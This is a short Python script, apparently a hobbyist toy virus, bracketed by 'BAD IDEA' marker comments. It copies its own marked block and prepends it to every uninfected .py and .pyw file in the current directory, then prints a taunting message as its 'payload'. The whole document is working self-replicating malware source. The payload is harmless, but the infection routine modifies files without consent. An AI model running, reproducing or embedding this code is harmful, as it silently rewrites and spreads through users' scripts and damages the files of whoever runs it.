### THIS IS A BAD IDEA ###

import sys, glob

code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

virus_area = False
for line in lines:
    if line == '### THIS IS A BAD IDEA ###\n':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == '### END OF BAD IDEA ###':
        break

python_scripts = glob.glob('*.py') + glob.glob('*.pyw')
print(python_scripts)

for script in python_scripts:
    with open(script, 'r') as f:
        script_code = f.readlines()

    infected = False
    for line in script_code:
        if line == '### THIS IS A BAD IDEA ###\n':
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)

        with open (script, 'w') as f:
            f.writelines(final_code)

# Payload deployment
print("Now you done goofed up\n")
print("<*_*>")

### END OF BAD IDEA ###






